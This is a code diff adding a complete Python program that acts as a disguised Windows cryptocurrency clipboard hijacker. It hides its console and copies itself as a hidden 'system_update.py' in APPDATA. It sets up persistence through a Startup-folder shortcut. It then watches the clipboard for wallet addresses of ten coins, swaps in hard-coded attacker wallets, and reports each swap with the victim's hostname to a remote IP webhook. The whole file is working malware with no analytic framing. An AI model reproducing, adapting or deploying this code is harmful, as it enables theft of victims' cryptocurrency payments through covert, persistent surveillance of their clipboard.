@@ -1,0 +1,180 @@
+import re
+import time
+import os
+import sys
+import shutil
+import ctypes
+import socket
+import pyperclip
+from urllib.request import Request, urlopen
+from json import dumps
+
+kernel32 = ctypes.WinDLL('kernel32')
+user32 = ctypes.WinDLL('user32')
+SW_HIDE = 0
+GetConsoleWindow = kernel32.GetConsoleWindow
+ShowWindow = user32.ShowWindow
+hwnd = GetConsoleWindow()
+if hwnd:
+    ShowWindow(hwnd, SW_HIDE)
+
+OWNER_USERNAME = "clippa"
+WEBHOOK_URL = "http://196.251.81.229:8000/repeter/uhmwtf"
+
+addresses = {
+    "btc": "bc1qxpz2e8taktzesd0sd53lzmj87m5nkvu3fp82rk",
+    "eth": "0x1842082Ff98E91495BDE6C6F9162F17AB9A9d3Cd",
+    "ltc": "LVCC3oZgciRWWBENTvwXPPgsw2KKpmVR7x",
+    "trx": "TUBGZiWupRrbAJ61Yhwh2LVHUf5x4nresE",
+    "bch": "",
+    "xmr": "",
+    "xrp": "rfcHfi5xqD64Z5PwwLnm9Lh3aafWMz6K9g",
+    "zcash": "t1JCPe5jCsn9aYSnSuvd7GXNKLK5PkHj3R3",
+    "doge": "DEzLhvQQZm3qhwJvEpXRB7mnrNDYFJmNmT",
+    "sol": "BCxiZdQiAddhZWnSt7hzYZhftbNcF9aV33ZyXCGfk6bj"
+}
+
+patterns = {
+    "btc": r"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,41}$",
+    "eth": r"^0x[a-fA-F0-9]{40}$",
+    "ltc": r"^(L|M|3|ltc1)[a-km-zA-HJ-NP-Z1-9]{26,33}$",
+    "trx": r"^T[a-zA-Z0-9]{28,33}$",
+    "bch": r"^((bitcoincash:)?(q|p)[a-z0-9]{41})$",
+    "xmr": r"^4[0-9AB][1-9A-HJ-NP-Za-km-z]{92,95}$",
+    "xrp": r"^r[0-9a-zA-Z]{24,34}$",
+    "zcash": r"^t1[0-9A-z]{32,39}$",
+    "doge": r"^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32,61}$",
+    "sol": r"^[1-9A-HJ-NP-Za-km-z]{32,44}$"
+}
+
+APPDATA_PATH = os.environ["APPDATA"]
+dest_path = os.path.join(APPDATA_PATH, "system_update.py")
+startup_folder = os.path.join(APPDATA_PATH, r"Microsoft\Windows\Start Menu\Programs\Startup")
+shortcut_path = os.path.join(startup_folder, "system_update.lnk")
+
+def LoadUrlib(hook, data='', headers=''):
+    for _ in range(8):
+        try:
+            if headers != '':
+                r = urlopen(Request(hook, data=data, headers=headers))
+            else:
+                r = urlopen(Request(hook, data=data))
+            return r
+        except:
+            pass
+
+def create_shortcut(target, shortcut):
+    try:
+        import pythoncom
+        from win32com.shell import shell, shellcon
+        from win32com.client import Dispatch
+
+        shell_link = Dispatch('WScript.Shell').CreateShortcut(shortcut)
+        shell_link.TargetPath = sys.executable
+        shell_link.Arguments = f'"{target}"'
+        shell_link.WorkingDirectory = os.path.dirname(target)
+        shell_link.WindowStyle = 7
+        shell_link.IconLocation = sys.executable
+        shell_link.Save()
+    except ImportError:
+        bat_path = shortcut + ".bat"
+        with open(bat_path, "w") as f:
+            f.write(f'start /min "" "{sys.executable}" "{target}"\n')
+
+def is_running_from_dest():
+    return os.path.abspath(sys.argv[0]) == os.path.abspath(dest_path)
+
+def clone_to_dest():
+    try:
+        shutil.copy2(sys.argv[0], dest_path)
+        ctypes.windll.kernel32.SetFileAttributesW(dest_path, 0x02)
+    except:
+        pass
+
+def create_mutex(name):
+    kernel32.CreateMutexW(None, False, name)
+    return kernel32.GetLastError() != 183
+
+def get_hostname():
+    try:
+        return socket.gethostname()
+    except:
+        return "unknown-host"
+
+def send_log(crypto_type, original_address, replaced_address):
+    try:
+        crypto_emojis = {
+            "btc": "<:btc:1375591719973949561>",
+            "eth": "<:Ethereum:1375591721760722954>",
+            "ltc": "<:Litecoin:1375591723274604544>",
+            "trx": "<:trxcrypto:1375591727808643133>",
+            "bch": "🌿",
+            "xmr": "👁️‍🗨️",
+            "xrp": "<:XRP:1375591730585534614>",
+            "zcash": "💰",
+            "doge": "<:Dogecoin:1375591731634114642>",
+            "sol": "<:Solana:1375591729377443890>"
+        }
+        emoji = crypto_emojis.get(crypto_type.lower(), crypto_type)
+
+        headers = {
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0"
+        }
+
+        data = {
+            "embeds": [
+                {
+                    "title": f"Crypto Clipboard Replacement {emoji}",
+                    "color": 12741348,
+                    "fields": [
+                        {"name": "User", "value": OWNER_USERNAME, "inline": True},
+                        {"name": "Host", "value": get_hostname(), "inline": True},
+                        {"name": "Crypto Type", "value": f"{emoji} {crypto_type.upper()}", "inline": True},
+                        {"name": "Original Address", "value": original_address, "inline": False},
+                        {"name": "Replaced Address", "value": replaced_address, "inline": False}
+                    ],
+                    "footer": {
+                        "text": "clippa",
+                        "icon_url": "https://cdn.discordapp.com/attachments/1354130179324379287/1371935531427954849/11131604.png"
+                    }
+                }
+            ],
+            "avatar_url": "https://cdn.discordapp.com/attachments/1354130179324379287/1371935531427954849/11131604.png",
+            "attachments": []
+        }
+
+        LoadUrlib(WEBHOOK_URL, data=dumps(data).encode(), headers=headers)
+    except Exception as e:
+        print(f"{e}")
+
+def monitor_clipboard():
+    recent_value = ""
+    while True:
+        try:
+            clipboard_value = pyperclip.paste()
+            if clipboard_value != recent_value:
+                recent_value = clipboard_value
+                for crypto, pattern in patterns.items():
+                    if re.match(pattern, clipboard_value):
+                        if crypto in addresses and addresses[crypto]:
+                            pyperclip.copy(addresses[crypto])
+                            send_log(crypto, clipboard_value, addresses[crypto])
+                            break
+        except:
+            pass
+        time.sleep(0.5)
+
+def main():
+    if not is_running_from_dest():
+        clone_to_dest()
+        create_shortcut(dest_path, shortcut_path)
+        import subprocess
+        subprocess.Popen([sys.executable, dest_path], creationflags=0x08000000)
+        sys.exit()
+
+    if create_mutex("crypto_clipboard_mutex"):
+        monitor_clipboard()
+
+if __name__ == "__main__":
+    main()
